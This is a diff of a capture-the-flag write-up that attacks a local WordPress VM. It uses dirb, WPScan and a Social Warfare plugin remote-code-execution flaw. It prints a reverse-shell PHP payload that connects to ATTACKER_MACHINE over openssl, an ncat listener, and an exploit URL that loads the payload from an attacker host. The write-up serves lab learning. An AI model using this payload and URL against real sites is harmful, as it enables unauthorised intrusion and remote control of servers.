@@ -48,7 +48,7 @@ Objectives:
 
     As there is no vulnerability that we can see in plain sight, dirb, will show us what are some sub-directories, and we can see that wordpress is installed:
   
-    ![dirb website results](img/5-dirb.png)
+    ![dirb website results](img/4-dirb.png)
 
 <br>
 
@@ -56,13 +56,17 @@ Objectives:
 
    As we saw on the las step wordpress is installed, WPScan will show wordpress, plugins and themes versions, as well as vulnerabilities associated with them, for this we'll need an api key that we can get by creating a free account.
 
-   And we'll run the command
-
-   `sudo wpscan --api-token <API> --url http://192.168.56.111/wordpress/ -e`
+   And we'll run the command:  `sudo wpscan --api-token <API> --url http://192.168.56.111/wordpress/ -e`
    
-   ![wpscan result](img/)
+   ![wpscan result](img/5-wpscanFirst.png)
 
-   After the scan we can see that Social Warfare is installed and on version 3.5.0 there is a vulnerability that wpscan recommends, we can also see users "max" and "admin".
+   Here we can see that the plugin "Social Warfare has an RCE vulnerability that is probably going to work:
+
+   ![wpscan social warfare RCE](img/6-wpscanSocialWarfare.png)
+
+   If we scroll down further we can see the wordpress users that exist, we can see "admin" and "max":
+
+   ![wpscan users](img/7-wpscanUsers.png)
 
 <br>
 
@@ -72,9 +76,9 @@ Objectives:
 
     - Web server
 
-       We need a web server to serve our payload, this will be apache as it comes pre-installed on kali, we only need to enable it:
+       We need a web server to serve our payload, this will be apache as it's simple and comes pre-installed on kali, we only need to enable it:
 
-       ![enable apache](img/)
+       ![enable apache](img/7-apacheStart.png)
 
 
     - Netcat
@@ -84,7 +88,7 @@ Objectives:
        The command to execute will be `ncat --ssl -vv -l -p 4242`.
        This will listen for any connection on port 4242.
       
-       ![running netcat listener](img/)
+       ![running netcat listener](img/8-ncatListener.png)
  
     - Payload
       
@@ -92,7 +96,9 @@ Objectives:
       
         ```<pre>system('mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_MACHINE:4242 > /tmp/s; rm /tmp/s')</pre>```
 
-       The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and the port needs to match the netcat listener above.
+      ![cat of the payload](img/9-catPayload.png)
+
+      The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and the port needs to match the netcat listener above.
 
 <br>
 
@@ -100,11 +106,17 @@ Objectives:
 
    To run the exploit we need to visit the next url on a web browser:
 
-   `VICTIM_MACHINE/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACK_MACHINE/exploit.txt`
+   `http://WEBSITE/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt`
 
    The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and "VICTIM_MACHINE to our so simple:1 vm, in my case 192.168.56.111
 
-   ![Exploit on web browser result](img/)
+   Here we can see what happens after visiting the URL:
+   
+   ![Exploit on web browser result](img/10-exploitWeb.png)
+
+   And if we go back to the ncat terminal we can see that it has established the connection and now we have a shell with the user "www-data":
+   
+   ![ncat receives the shell](img/11-exploitNcat.png)
    
 <br>
 
